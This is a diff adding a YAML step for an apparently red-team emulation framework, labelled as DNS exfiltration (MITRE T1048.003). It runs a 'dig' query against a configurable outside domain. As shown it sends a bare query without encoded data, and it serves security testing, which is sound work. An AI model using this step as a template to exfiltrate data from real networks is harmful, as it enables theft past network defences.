@@ -1,0 +1,33 @@
+---
+api_version: 2.0
+uuid: b5eb16ec-07ed-49b6-acf3-8396ddd293bc
+name: "Exfiltrate data over DNS using dig"
+authors:
+  - sledge
+description: |
+  This is designed to be used as a sub-TTP step.
+  It takes a domain and query type as input and uses dig to send a DNS query to the domain.
+requirements:
+  platforms:
+    - os: linux
+mitre:
+  tactics:
+    - TA0010 Exfiltration
+  techniques:
+    - T1048 Exfiltration Over Alternative Protocol
+  subtechniques:
+    - T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol
+args:
+  - name: domain
+    description: |
+      The domain to send queries to
+    default: workwithincreasedintensity.com
+  - name: query_type
+    description: |
+      The query type to send.
+    default: A
+steps:
+  - name: send-data
+    inline: |
+      echo "Sending data over DNS using dig: dig +short {{.Args.domain}} -t {{.Args.query_type}}"
+      dig +short {{.Args.domain}} -t {{.Args.query_type}}
